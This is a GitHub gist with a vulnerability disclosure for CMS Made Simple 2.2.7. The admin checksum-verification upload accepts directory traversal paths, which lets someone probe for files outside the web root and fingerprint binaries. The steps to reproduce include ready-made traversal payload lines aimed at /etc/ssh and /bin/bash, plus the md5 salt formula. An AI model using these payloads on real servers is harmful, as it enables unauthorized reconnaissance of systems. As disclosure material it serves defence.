=== Content from gist.github.com_7ce7aa3a_20250125_061057.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2F0xn1k5%2Fef4c7c7a26c7d8a803ef3a85f1000c98)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2F0xn1k5%2Fef4c7c7a26c7d8a803ef3a85f1000c98&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2F0xn1k5%2Fef4c7c7a26c7d8a803ef3a85f1000c98) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2F0xn1k5%2Fef4c7c7a26c7d8a803ef3a85f1000c98&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@0xn1k5](https://avatars.githubusercontent.com/u/934150?s=64&v=4)](/0xn1k5)

# [0xn1k5](/0xn1k5)/**[gist:ef4c7c7a26c7d8a803ef3a85f1000c98](/0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98)**

Created
April 9, 2018 20:13

Show Gist options

* [Download ZIP](/0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98/archive/822da1a4e0d8dda7c52423b542666cbc642878db.zip)

* [Star
  0
  (0)](/login?return_to=https%3A%2F%2Fgist.github.com%2F0xn1k5%2Fef4c7c7a26c7d8a803ef3a85f1000c98)You must be signed in to star a gist
* [Fork
  0
  (0)](/login?return_to=https%3A%2F%2Fgist.github.com%2F0xn1k5%2Fef4c7c7a26c7d8a803ef3a85f1000c98)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98.js&quot;&gt;&lt;/script&gt;
* Save 0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98 to your computer and use it in GitHub Desktop.

[Code](/0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98)
[Revisions
1](/0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98.js&quot;&gt;&lt;/script&gt;

Save 0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98 to your computer and use it in GitHub Desktop.

[Download ZIP](/0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98/archive/822da1a4e0d8dda7c52423b542666cbc642878db.zip)

Possible to brute force and fingerprint known files and directories in CMS Made Simple web application

 [Raw](/0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98/raw/822da1a4e0d8dda7c52423b542666cbc642878db/gistfile1.txt)

[**gistfile1.txt**](#file-gistfile1-txt)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | Issue Description: |
| --- | --- |
|  | CMS Made Simple web application has the feature which allows the admin user to download a checksum file which can be used to verify the integrity of files in case of any hacking attempt. It was observed that the user can upload a custom checksum verification file to identify the valid directory and files outside the website installation directory using directory traversal technique. |
|  |  |
|  | Issue verified on version: CMS Made Simple V 2.2.7 (latest), earlier version may also be affected |
|  | Download Link: http://s3.amazonaws.com/cmsms/downloads/14144/cmsms-2.2.7-install.zip |
|  | Vendor Site: https://www.cmsmadesimple.org/about/cms-made-simple/ |
|  |  |
|  | Risk: |
|  | It may allow the user to verify the applications installed by probing known files and directories. |
|  | In case of default installations, It is also possible to fingerprint the known binaries by comparing the md5 hash to identify the application/binary version. |
|  |  |
|  | Steps to reproduce the issue: |
|  |  |
|  | 1) Login to admin dashboard using below url or navigate to "Site Admin" > "System Verification" > "Perform Validation" |
|  |  |
|  | http://target/path/admin/checksum.php?\_\_c=fde83629cd9b67f8911 |
|  |  |
|  | 2) Download the checksum file and upload the modified checksum file having below entry: |
|  |  |
|  | Case 1: If Directory exists - Output: "All Checksum match" |
|  |  |
|  | c8c2bbfe37084ec6db23ad5a7f6c1114--::--/modules/Search/templates/../../../../../../../../../../../../../../../etc/ssh |
|  |  |
|  | Case 2: If Directory doesn't exists - Output: "1 File not found" |
|  |  |
|  | c8c2bbfe37084ec6db23ad5a7f6c1114--::--/modules/Search/templates/../../../../../../../../../../../../../../../etc/ssh2 |
|  |  |
|  | Case 3: If File exists - Output: "1 Files failed md5sum check" |
|  |  |
|  | c8c2bbfe37084ec6db23ad5a7f6c1114--::--/modules/Search/templates/../../../../../../../../../../../../../../../etc/ssh/ssh\_config |
|  |  |
|  | Case 4: If File doesn't exists - Output: "1 File not found" |
|  |  |
|  | c8c2bbfe37084ec6db23ad5a7f6c1114--::--/modules/Search/templates/../../../../../../../../../../../../../../../etc/ssh/ssh\_config\_no\_file |
|  |  |
|  | 3) The checksum values on left side is made using below formula. In case of default installations, md5 checksum of /lib/version.php and index.php files can identified via test setup and combined with md5sum of known binary be used to probe the server. |
|  |  |
|  | Code Snippet: |
|  |  |
|  | $salt = md5\_file($config['root\_path']."/lib/version.php").md5\_file($config['root\_path']."/index.php"); |
|  | : |
|  | : |
|  | $md5 = md5($salt.md5\_file($fn)) |
|  |  |
|  | Case: Verifying checksum of /bin/bash - Output: "All checksums match those in the uploaded file" |
|  |  |
|  | 71fdfce0a76d11f6db3e3ac730bf223a--::--/modules/Search/templates/../../../../../../../bin/bash |
|  |  |

[![@0xn1k5](https://avatars.githubusercontent.com/u/934150?s=80&v=4)](/0xn1k5)

Copy link

Author

### **[0xn1k5](/0xn1k5)** commented [Apr 9, 2018](/0xn1k5/ef4c7c7a26c7d8a803ef3a85f1000c98?permalink_comment_id=2473225#gistcomment-2473225)

**Probing a valid file**

[![directory-structure-mapping-01-valid-file](https://user-images.githubusercontent.com/934150/38520527-ae55f728-3c60-11e8-86ef-e63fb6e7b1fd.PNG)](https://user-images.githubusercontent.com/934150/38520527-ae55f728-3c60-11e8-86ef-e63fb6e7b1fd.PNG)

**Probing a invalid file**

[![directory-structure-mapping-01-invalid-file](https://user-images.githubusercontent.com/934150/38520531-afcb284e-3c60-11e8-93b5-5780ce793c87.PNG)](https://user-images.githubusercontent.com/934150/38520531-afcb284e-3c60-11e8-93b5-5780ce793c87.PNG)

**Probing a valid directory name**

[![directory-structure-mapping-01-valid-directory](https://user-images.githubusercontent.com/934150/38520532-b0020c38-3c60-11e8-8bd1-448fdfc0d8f3.PNG)](https://user-images.githubusercontent.com/934150/38520532-b0020c38-3c60-11e8-8bd1-448fdfc0d8f3.PNG)

**Probing a invalid directory name**

[![directory-structure-mapping-01-invalid-directory](https://user-images.githubusercontent.com/934150/38520530-af94f6ac-3c60-11e8-8735-cc578494e21f.PNG)](https://user-images.githubusercontent.com/934150/38520530-af94f6ac-3c60-11e8-8735-cc578494e21f.PNG)

**Calculating md5 hash for known binary**

[![fingerprinting-known-binary-02](https://user-images.githubusercontent.com/934150/38520529-af64ce6e-3c60-11e8-8fc5-c80de2872e4f.PNG)](https://user-images.githubusercontent.com/934150/38520529-af64ce6e-3c60-11e8-8fc5-c80de2872e4f.PNG)

**Verifying/fingerprinting the known binary using md5 checksum calculated above**

[![fingerprinting-known-binary-01](https://user-images.githubusercontent.com/934150/38520528-ae974b60-3c60-11e8-832e-462ef164df7f.PNG)](https://user-images.githubusercontent.com/934150/38520528-ae974b60-3c60-11e8-832e-462ef164df7f.PNG)

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2F0xn1k5%2Fef4c7c7a26c7d8a803ef3a85f1000c98)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


